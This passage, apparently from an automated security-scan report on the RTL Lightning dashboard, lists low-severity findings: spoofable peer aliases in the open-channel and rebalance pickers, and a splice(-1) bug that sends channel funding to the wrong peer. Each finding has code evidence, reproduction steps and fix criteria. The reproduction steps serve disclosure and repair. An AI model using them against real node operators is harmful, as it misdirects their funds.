1. A remote Lightning peer with an active channel to the operator's LND node (inbound liquidity >= the rebalance amount) announces an alias equal, case-insensitively, to another of the operator's channel peers (or to the 20-hex-char pubkey prefix RTL shows for a peer without an announcement). The alias reaches RTL via LND /v1/graph/node with no RTL credentials. The operator opens Circular Rebalance on some channel, types the impersonated alias into 'Receive from Peer', blurs/presses Enter or clicks Select Fee, and submits; the attacker's channel is silently chosen as the last hop. Requires a channel with the victim node, sorting first among the colliding aliases, and the typed (not clicked) selection path.

## Recommended fix
1. onSelectedPeerChanged in the LND rebalance modal resolves a typed alias to a channel by picking the first case-insensitive remote_alias match, treating a non-unique, peer-chosen label as an identifier. Fix criteria: A typed value must resolve to a channel only when it identifies exactly one active channel (unique alias match, or a match on chan_id / remote_pubkey); with zero or multiple matches the control must be marked invalid and both Select Fee and Rebalance must be blocked. Verify by loading two channels with aliases differing only in case, typing the alias, blurring or clicking Select Fee, and confirming no channel is selected and the form shows an error.
2. The stepper label and the resolved display value show only the alias, so two channels with colliding aliases cannot be told apart before the payment is sent. Fix criteria: The step label, displayFn and the status view must display the resolved channel's chan_id (or remote_pubkey) alongside the alias so the operator can see which channel will receive the rebalance before confirming.

---
**Severity:** LOW
**Status:** Open
**Category:** Duplicate identifier resolution
**CWE:** [CWE-694](https://cwe.mitre.org/data/definitions/694.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257338

---

# CLN open-channel peer picker selects funding counterparty solely by remote-controlled alias

## Details
This is the Core Lightning sibling of lnd-open-channel-peer-picker-alias-only-spoofable; the CLN modal has the same structure and the same defect, filed separately because it is a different component, route (/cln/connections/channels) and backend path (/cln/channels -> CLN fundchannel).

CLNOpenChannelComponent is the dialog behind 'Open Channel' on the CLN channels page. When no peer is preselected it asks the operator to pick the counterparty from a mat-autocomplete whose options, display value and filter are all the peer's `alias` (`{{peer.alias ? peer.alias : peer.id}}`, `displayFn`, `filterPeers`). The pubkey is never shown in this flow (the pubkey/netaddr block is `*ngIf="peer"`, only for a preselected peer) and typing a pubkey matches nothing. `onSelectedPeerChanged` resolves the clicked option to `selectedPubkey = selectedPeer.value.id`; `onOpenChannel` posts it as `id` together with `amount` (or `'all'` of the selected UTXOs), `announce`, `feerate`, `minconf`, `utxos`. The backend forwards the body verbatim to CLN `fundchannel`.

Aliases are self-declared gossip (server/controllers/cln/network.ts getAlias copies `nodes[0].alias` from listnodes) and are not unique. A CLN node with a public listen address accepts inbound peer connections from any node (assumption about Core Lightning default behaviour), and the picker lists every peer `listpeers` returns. A malicious node therefore connects to the victim's CLN, announces an alias identical to that of a peer the operator trusts (e.g. a well-known routing node the victim already peers with, observable in the public graph), and waits. The operator opening a channel by alias sees two identical entries (adjacent, since `sortedPeers` sorts by lower-cased alias) with nothing to tell them apart; choosing the wrong one funds a channel to the attacker. If the operator types the alias and tabs out without clicking, `onSelectedPeerChanged` finds two length-equal matches and sets `notfound`, so only the click path is affected - which is the normal way to use an autocomplete.

What the attacker gains: a channel funded by the victim (inbound liquidity with market value), the victim's funds locked with an untrusted counterparty, and the option to grief by force-closing or going offline (funds unavailable for the CSV delay, fees borne by the victim). Funds are not directly stolen and can be recovered by closing. The threat model names remote peers' aliases as the primary attacker-controlled input into the UI; here the alias is injected into a funds-committing selection rather than the DOM. The LND rebalance modal in the same repository appends `chan_id` to each option, so the fix pattern exists locally.

## Evidence
1. [src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.html:12–20](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.html#L12-L20)
   When the modal is opened without a preselected peer, the 'Peer Alias' mat-autocomplete renders each option as {{peer.alias ? peer.alias : peer.id ? peer.id : ''}}: the pubkey is shown only when the alias is empty, so two peers carrying the same alias produce two indistinguishable options.
2. [src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.ts:114–136](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.ts#L114-L136)
   filterPeers matches on alias prefix only (typing a pubkey finds nothing), displayFn shows the alias, and onSelectedPeerChanged resolves the clicked option to selectedPubkey = selectedPeer.value.id (or, for a typed string, to the single alias-equal peer's id). The alias is the only identifier the operator ever acts on.
3. [src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.ts:203–217](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.ts#L203-L217)
   onOpenChannel dispatches saveNewChannel with peerId = selectedPubkey (whichever duplicate-alias entry was clicked) together with the operator's amount (or 'all' of the selected UTXOs), announce flag, feerate, minconf and utxos; no confirmation of the pubkey precedes the dispatch.
4. [src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.html:113–139](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/peers-channels/channels/open-channel-modal/open-channel.component.html#L113-L139)
   The only block that displays the pubkey/netaddr (peerDetailsExpansionBlock) is *ngIf="peer", i.e. rendered only when a peer row was preselected from the Peers table; in the alias-picker flow the pubkey that will be funded is never shown before submit.
5. [src/app/cln/peers-channels/channels/channels-tables/channels-tables.component.ts:75–90](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/peers-channels/channels/channels-tables/channels-tables.component.ts#L75-L90)
   The generic 'Open Channel' button on the CLN channels page passes the full, unfiltered store peers list (every peer CLN listpeers reports, including inbound-connected peers with no channel) to CLNOpenChannelComponent with no preselected peer, so the alias-only picker is the default channel-opening path.
6. [server/controllers/cln/network.ts:95–138](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/network.ts#L95-L138)
   getAlias sets peer.alias to body.nodes[0].alias from CLN listnodes, i.e. the remote node's own node_announcement gossip, verbatim; aliases are self-declared, not unique and fully attacker-chosen. peers.ts getPeers/postPeer apply it to every listed peer.
7. [src/app/cln/store/cln.effects.ts:283–293](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/store/cln.effects.ts#L283-L293)
   openNewChannelCL posts { id: payload.peerId, amount, feerate, announce, minconf?, utxos? } to the CLN channels API; the id is the pubkey resolved from the alias click, with no further check.
8. [server/controllers/cln/channels.ts:41–55](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/channels.ts#L41-L55)
   openChannel (POST /rtl/api/cln/channels, isAuthenticated) copies req.body verbatim into the request to CLN /v1/fundchannel, so the impostor's id selected in the picker is the counterparty CLN funds.

## Impact
The operator's funds-moving action is redirected to an attacker-chosen counterparty: integrity of the channel-open operation is compromised, but the sats remain the operator's channel balance (recoverable via close) so integrity is LOW. The attacker can force-close or stay offline, leaving the committed amount unavailable for the CSV delay / until recovery, so availability of those funds is LOW. No confidentiality impact.

## Reproduction steps
1. Attacker: any remote Lightning node able to connect inbound to the victim's CLN. Steps: set node alias equal to a peer the victim is likely to fund (visible in the public graph), connect to the victim's node, wait. Victim opens Channels > Open Channel, clicks the alias in the autocomplete (one of two identical entries), enters an amount, submits; RTL posts the impostor's id to /cln/channels and CLN funds the channel. Requires the victim to actually open a channel to that alias (active interaction) plus inbound connectivity and a mimicable trusted alias (attack requirements present). No RTL credentials needed.

## Recommended fix
The peer selection control for a funds-committing action presents and matches peers only by their self-declared, non-unique alias, so an impostor peer is indistinguishable from the intended one and the pubkey that will be funded is never shown before submit. Fix criteria: Every option and the selected value in the CLN open-channel picker must show an unforgeable identifier (full or clearly truncated pubkey) alongside the alias, pubkey input must be matched by the filter, and duplicate aliases must be flagged or disambiguated. Verify: with two connected peers sharing an alias, the operator can tell them apart in the dropdown and sees the pubkey that will be funded before submitting.

---
**Severity:** LOW
**Status:** Open
**Category:** UI misrepresentation
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257337

---

# Connect-peer flow opens channel with wrong peer when new peer is not first in list

## Details
The 'Connect to a new peer' dialog (ConnectPeerComponent, LND) has an optional second step that opens a channel to the peer just connected. The counterparty is not the pubkey the operator typed: it is `newlyAddedPeer.pub_key`, where `newlyAddedPeer` is `postRes[0]` of the POST /rtl/api/lnd/peers response (lnd.effects.ts saveNewPeer, line 197). The backend (server/controllers/lnd/peers.ts postPeer) builds that list by calling LND ConnectPeer, then GET /v1/peers, then `common.newestOnTop(body.peers, 'pub_key', pubkey)` with the raw request-body pubkey. `newestOnTop` (server/utils/common.ts:416-420) is `array.splice(array.findIndex(item => item[key] === value), 1)` followed by `unshift`: when no listed peer's `pub_key` is strictly equal to the string the client sent, `findIndex` returns -1 and `splice(-1, 1)` removes the LAST peer in LND's list and moves it to index 0. Nothing on either side checks that the element at index 0 is the peer that was requested. The component stores it as `newlyAddedPeer`, locks the peer step (flgEditable=false), advances the stepper, labels step 1 'Peer Added: <that peer's alias>', and `onOpenChannel()` dispatches saveNewChannel with `selectedPeerPubkey = newlyAddedPeer.pub_key`, which openNewChannel (lnd.effects.ts:288-289) posts as `node_pubkey` and channels.ts:165 forwards to LND as `node_pubkey_string` with the operator's `local_funding_amount` or `fund_max`. The funding transaction therefore commits the operator's funds (up to the whole wallet with fund_max) to a channel with an existing, unchosen peer; LND's ListPeers order comes from a Go map, so which peer is picked is arbitrary.

Two ways to make the match miss:
1. Deterministically, by the pubkey spelling in the pasted URI. The frontend sends the typed `pubkey@host` string verbatim (substring, no trim/lowercase; connect-peer.component.ts:167-173) and the backend compares with `===`. RTL's own `parseNodePubkey` regex (common.ts:689, `/^[0-9a-fA-F]{66}$/`) treats upper-case hex as a valid pubkey, so the graph-lookup path accepts it too. Assumption about the external dependency lnd (any version with the v1 REST API): ConnectPeer decodes `addr.pubkey` with Go `hex.DecodeString`, which accepts upper-case digits, while ListPeers returns `hex.EncodeToString`, lower-case. A node URI published with upper-case hex (a web page, a QR code in alphanumeric mode) connects fine but never matches, every time.
2. By the remote peer (threat-model adversary 3): if it completes the Noise handshake, so ConnectPeer returns success, and drops or fails Init before LND serves RTL's immediate GET /v1/peers, it is absent from the list and the same -1 path is taken. This is a race the peer usually loses when RTL and LND are co-located (its FIN or Init arrives one network RTT after Act Three, while RTL's re-list is a local round trip); it is realistic when lnServerUrl is remote or slow.

The operator-visible evidence of the swap is only the alias in the step label; the pubkey about to receive the channel is never shown. The pre-existing ledger dismissal of newestOnTop (dismissed-peers-70-f72f) considered only response ordering; the consequence traced here is misdirected channel funding. test/backend/lnd-peers.test.mjs:121-138 covers only the exact-match case.

## Evidence
1. [src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts:204–209](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts#L204-L209)
   onOpenChannel dispatches saveNewChannel with selectedPeerPubkey = this.newlyAddedPeer?.pub_key, the peer the server returned at index 0, not the pubkey the operator typed in step 1 (peerFormGroup.controls.peerAddress); this binds the funding amount / fund_max to a possibly different counterparty and is where the fix must verify or substitute the intended pubkey.
2. [server/utils/common.ts:416–420](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L416-L420)
   newestOnTop does array.splice(array.findIndex(item => item[key] === value), 1) then unshift. A findIndex miss returns -1 and splice(-1, 1) removes the LAST element, so an arbitrary existing peer is rotated to index 0 and reported as the newly added one (an empty list yields [undefined]).
3. [server/controllers/lnd/peers.ts:59–77](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/peers.ts#L59-L77)
   postPeer connects, re-lists peers and calls common.newestOnTop(body.peers, 'pub_key', pubkey) with the raw req.body pubkey (no trim/lowercase, no check that the match succeeded); the reordered list is the 201 body.
4. [src/app/lnd/store/lnd.effects.ts:184–205](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/store/lnd.effects.ts#L184-L205)
   saveNewPeer posts {pubkey, host, perm} and emits NEWLY_ADDED_PEER_LND with payload { peer: postRes[0] } (line 197), trusting list position as identity without comparing pub_key to the pubkey it sent.
5. [src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts:142–147](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts#L142-L147)
   On NEWLY_ADDED_PEER_LND the component stores action.payload.peer as newlyAddedPeer, locks the peer step (flgEditable=false) and advances the stepper, so whatever element the backend rotated to index 0 becomes the channel counterparty.
6. [src/app/lnd/store/lnd.effects.ts:288–289](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/store/lnd.effects.ts#L288-L289)
   openNewChannel posts node_pubkey: action.payload.selectedPeerPubkey to the channels API together with local_funding_amount or fund_max; server/controllers/lnd/channels.ts:165 forwards it to LND /v1/channels as node_pubkey_string.
7. [src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts:162–187](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/connect-peer/connect-peer.component.ts#L162-L187)
   onConnectPeer cuts the pubkey verbatim from the typed 'pubkey@host' string with substring (no trim/lowercase) and connectPeerWithParams sends it unnormalised, so any spelling LND accepts but does not echo back (upper-case hex) guarantees the findIndex miss.
8. [server/utils/common.ts:689](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L689)
   RTL's own parseNodePubkey accepts /^[0-9a-fA-F]{66}$/, so the project itself treats mixed-case hex as a valid node pubkey (the no-'@' graph-lookup path accepts it), while postPeer's === comparison against LND's lower-case output does not.

## Impact
Integrity of a funds-moving operator action is violated: the channel funding transaction commits the chosen amount, or the whole spendable wallet with fund_max, to a channel with an existing peer the operator did not choose and whose identity is random (Go map order). The attacker cannot direct the funds to itself (unless it happens to be the rotated peer), and the funds remain the operator's channel balance, recoverable by a cooperative or force close at on-chain cost and timelock delay, so integrity is rated LOW rather than HIGH. No confidentiality or availability effect on RTL itself.

## Reproduction steps
1. Attacker is the third party whose node URI the operator pastes into Connect Peer, or the remote Lightning node being connected (threat-model adversary 3); no RTL privileges are needed. Deterministic route: publish the URI with upper-case hex; LND connects (assumption: lnd ConnectPeer uses Go hex.DecodeString, ListPeers emits lower-case), postPeer's === never matches, newestOnTop rotates a random existing peer to index 0, the stepper advances to the channel step with that peer, and the operator's Open Channel posts the wrong node_pubkey. Race route: the peer completes the Noise handshake then drops before RTL's immediate GET /v1/peers; usually lost when RTL and LND are co-located, viable with a remote lnServerUrl. Attack requirements PRESENT for the non-default URI spelling or the race; the operator must actively fill the amount and click Open Channel (UI:ACTIVE), with only a step-label alias as the cue.

## Recommended fix
1. The frontend identifies the newly connected peer by its position in the returned list (postRes[0]) and uses that element's pub_key as the channel counterparty, instead of the pubkey the operator supplied, and never shows the operator the pubkey about to receive the channel. Fix criteria: The channel opened from the connect-peer stepper must target exactly the pubkey entered in step 1 (normalised to lower-case hex), or the step must refuse to advance when the returned peer's pub_key does not equal it; the channel step should display the counterparty pubkey. Verify: connect with an upper-case-hex URI (or a peer that disconnects immediately) and confirm the open-channel step either targets that pubkey or is blocked with an error, never another peer.
2. server newestOnTop treats a findIndex miss (-1) as a valid index, so splice(-1,1) rotates the last element to the front; lnd postPeer (and the Eclair sibling at server/controllers/eclair/peers.ts:89) compare the raw client string against the node's canonical lower-case hex. Fix criteria: newestOnTop must leave the array untouched (or signal not-found) when the key is absent, and postPeer must normalise the client pubkey (trim, lower-case) before comparison. Verify with a peer list lacking the connected pubkey: the response order is unchanged and no element is undefined; add a test beside test/backend/lnd-peers.test.mjs:121 for the mismatch case.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect reference resolution
**CWE:** [CWE-706](https://cwe.mitre.org/data/definitions/706.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257271

---

# Open-channel peer picker identifies peers solely by remote-controlled alias

## Details
OpenChannelComponent is the dialog behind the generic 'Open Channel' button on the LND Channels page (channels-tables.component.ts:77-91 passes the full connected-peers list with no preselected peer). In that flow the counterparty is chosen from a mat-autocomplete whose option text, display value and filter are all the peer's `alias` (`{{peer.alias ? peer.alias : peer.pub_key ...}}` at open-channel.component.html:16, `displayFn` and `filterPeers` at .ts:120-126). The pubkey/address block is `*ngIf="peer"` (html:105) and so is rendered only when a peer row preselected it; typing a pubkey matches nothing. `onSelectedPeerChanged` (.ts:128-142) resolves the clicked option to `selectedPubkey = value.pub_key`, and `onOpenChannel` (.ts:192-197) dispatches `saveNewChannel`, which lnd.effects.ts:288-291 posts as `node_pubkey` with `local_funding_amount`/`fund_max` to POST /lnd/channels (server/controllers/lnd/channels.ts:158-168 forwards it as `node_pubkey_string` to LND /v1/channels).

`peer.alias` is self-declared gossip data: server/controllers/lnd/peers.ts:9-12 copies `node.alias` from the remote node's own announcement; aliases are not unique. Assumption about the dependency: LND accepts inbound peer connections from any node that reaches its listen address and lists them in /v1/peers (default lnd behaviour; RTL lists every connected peer in this picker, channels-tables.component.ts:64-71). A malicious node therefore connects to the victim's LND announcing an alias identical to that of a peer the operator already has and is likely to fund. The picker then shows two identical entries (sorted adjacent by `sortedPeers`, .ts:103-107; stable sort preserves LND's map order, so which comes first is effectively random) with nothing to tell them apart; clicking the impostor's entry funds a channel to the attacker. If the operator types the alias and submits without clicking, the two-match case sets `notfound`, but clicking either option succeeds.

What the project concedes versus this path: the peers table always shows `pub_key` beside `alias` (peers.component.html:27-39), the per-row Open Channel action preselects the peer and shows its pubkey (peers.component.ts:147-160 -> peerDetailsExpansionBlock), the connect-peer flow funds the pubkey the operator typed (connect-peer.component.ts:204), and the rebalance picker appends `chan_id` to every option (channel-rebalance.component.html:43). Only this default flow binds a funds-committing action to an alias with no verifiable identifier.

Gain: a channel funded by the victim toward the attacker (inbound liquidity with market value), the victim's funds committed to an untrusted counterparty, and griefing by force-closing or going offline (funds unavailable for the CSV delay; open/close on-chain fees borne by the initiator). Funds are not directly stolen.

## Evidence
1. [src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.html:12–20](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.html#L12-L20)
   The 'Peer Alias' autocomplete used when the modal is opened without a preselected peer renders each option as {{peer.alias ? peer.alias : peer.pub_key}} (line 16) - the pubkey is shown only when the alias is empty, so two connected peers with the same remote-chosen alias produce two indistinguishable options. This is the primary location the fix must change.
2. [src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts:120–141](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts#L120-L141)
   filterPeers matches only on alias prefix (typing a pubkey finds nothing), displayFn shows alias only, and onSelectedPeerChanged resolves the chosen/typed alias to selectedPubkey = selPeer[0].pub_key - the first peer whose alias matches.
3. [src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts:182–197](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts#L182-L197)
   onOpenChannel dispatches saveNewChannel with selectedPeerPubkey = selectedPubkey, committing fundingAmount / fund_max to whichever peer object carried the alias.
4. [src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.html:104–130](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.html#L104-L130)
   The only place the modal shows a pubkey/address is the peerDetailsExpansionBlock, rendered *ngIf="peer" - i.e. only when a peer was preselected from the peers table row, never in the alias-picker flow.
5. [src/app/lnd/peers-channels/channels/channels-tables/channels-tables.component.ts:64–91](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channels-tables/channels-tables.component.ts#L64-L91)
   The generic 'Open Channel' button on the Channels page passes the full connected-peers list and no preselected peer to OpenChannelComponent (lines 77-91), so the alias-only picker is the default channel-open path; lines 67-70 also fill an empty alias with the pubkey prefix, so every entry is rendered by alias.
6. [server/controllers/lnd/peers.ts:9–15](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/peers.ts#L9-L15)
   peer.alias is taken verbatim from the remote node's own gossip announcement (/v1/graph/node/<pubkey>.node.alias); aliases are not unique and are fully attacker-chosen.
7. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html:41–44](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html#L41-L44)
   Sibling picker in the same tree renders '{{remote_alias}} - {{chan_id}}', showing that the maintainers already disambiguate aliases elsewhere; the open-channel picker does not.

## Impact
The operator's funds-moving action is redirected to an attacker-chosen counterparty: integrity of the channel-open operation is compromised, but the sats remain the operator's channel balance (recoverable via close) so integrity is LOW. The attacker can then force-close or stay offline, leaving the committed amount unavailable for the CSV delay / until recovery, so availability of those funds is LOW. No confidentiality impact.

## Reproduction steps
1. Attacker: any remote Lightning node able to connect inbound to the victim's LND. Steps: set node alias equal to a peer the victim is likely to fund (observable from the public graph), connect to the victim's node, wait. Victim opens Channels > Open Channel, picks the alias from the autocomplete, enters an amount, submits; RTL posts node_pubkey of the impostor. Requires the victim to actually open a channel to that alias (active interaction) and an existing/likely trusted alias to mimic plus inbound connectivity (attack requirements present). No RTL credentials needed.

## Recommended fix
The peer selection control for a funds-committing action presents and matches peers only by their self-declared, non-unique alias, so an impostor peer is indistinguishable from the intended one. Fix criteria: Every option and the selected value in the open-channel picker must show an unforgeable identifier (full or clearly truncated pubkey) alongside the alias, pubkey input must be matched by the filter, and duplicate aliases must be flagged or disambiguated. Verify: with two connected peers sharing an alias, the operator can tell them apart in the dropdown and in the confirmation before submit, and the pubkey that will be funded is visible.

---
**Severity:** LOW
**Status:** Open
**Category:** UI misrepresentation
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257270

---

# Eclair rebalance target chosen by first case-insensitive alias match, letting a peer hijack rebalances

## Details
The Eclair Circular Rebalance dialog lets the operator pick the channel the rebalance payment should return through by typing the peer's alias into 'Receive from Peer'. When the operator types and leaves the field or presses Enter (the input's (change) handler) instead of clicking an autocomplete option, onSelectedPeerChanged() resolves the string with:

  foundChannels = activeChannels.filter(c => c.alias?.length === typed.length && c.alias?.toLowerCase().indexOf(typed.toLowerCase()) === 0)
  if (foundChannels.length > 0) selRebalancePeer.setValue(foundChannels[0])

This is case-insensitive alias equality, and the first of any number of matches is accepted silently. Channel aliases are neither unique nor chosen by the operator: server/controllers/eclair/channels.ts simplifyAllChannels copies them verbatim from the remote peers' gossip node_announcements via Eclair /nodes (falling back to the first 20 hex chars of the nodeId for peers with no announcement, a string another peer can announce as its alias). A remote peer with a NORMAL channel to the operator's Eclair node can announce an alias equal (modulo case) to that of another of the operator's channel peers. The modal sorts activeChannels by lower-cased alias with ties kept in the store's order (descending balancedness), so the impersonating peer becomes foundChannels[0] by keeping its channel better balanced than the impersonated peer's.

The stepper label then shows only 'Peer: <alias>' (nodeId only when alias is empty), so the two channels cannot be told apart at confirmation. onRebalance() posts the resolved channel's shortChannelId/nodeId as targetShortChannelId/targetNodeId to /rtl/api/ecl/channels/circularRebalance, which finds a route from the source peer to the target peer, appends the target scid and pays via Eclair /sendtoroute. The operator's outbound liquidity is pushed into the attacker's channel instead of the intended one, the attacker is paid its advertised forwarding fee for the final hop, and the intended rebalance still has to be repeated. If the attacker's channel lacks inbound capacity for the amount (only toRemote > 0 is required for selection), the rebalance simply fails.

The sibling Open Channel dialog (open-channel.component.ts onSelectedPeerChanged) does the equivalent alias-to-peer resolution and accepts it only when exactly one peer matches, otherwise flagging the field as not found; the rebalance modal lacks that guard. The autocomplete option list renders alias plus shortChannelId precisely because aliases collide, but the typed path discards that disambiguation. The LND rebalance modal (src/app/lnd/.../channel-rebalance.component.ts:275-285, remote_alias / foundChannels[0]) has the same defect and should be filed and fixed alongside.

Impact is limited: funds stay in the operator's own channels apart from the forwarding fee paid to the attacker, and the attack needs an operator who types the alias rather than clicking it. But the source (gossip alias) is set by an unauthenticated remote peer named in the threat model, the sink is a fund-moving action whose target the operator did not choose, and the fix is the uniqueness check the codebase already applies elsewhere.

## Evidence
1. [src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:143–154](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L143-L154)
   onSelectedPeerChanged resolves the typed 'Receive from Peer' string by filtering activeChannels on alias length equality plus case-insensitive prefix match (case-insensitive alias equality) and unconditionally takes foundChannels[0]. The filter runs on activeChannels (toRemote > 0), not the amount-filtered list, and never checks that the match is unique. This is the code the fix must change.
2. [src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:110–134](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L110-L134)
   onRebalance posts selRebalancePeer.value.shortChannelId / .nodeId as targetShortChannelId / targetNodeId to DataService.circularRebalance (data.service.ts:356-358 -> POST /rtl/api/ecl/channels/circularRebalance); whichever channel [0] resolved to is the channel the payment returns through.
3. [src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html:41–43](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html#L41-L43)
   The input's (change) handler calls onSelectedPeerChanged with the raw typed string when the operator types the alias and blurs or presses Enter instead of clicking an autocomplete option (optionSelected hands over a Channel object, which the typeof check skips). The dropdown itself renders alias plus shortChannelId, showing the project knows aliases collide; the typed path discards that disambiguation.
4. [src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:60–65](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L60-L65)
   activeChannels is the store's active list (ecl.effects.ts:743 sortDescByKey by balancedness) re-sorted by lower-cased alias; for equal lower-cased aliases the stable sort keeps the balancedness order, so the better-balanced of two same-alias channels is foundChannels[0]. A peer influences its own channel's balancedness.
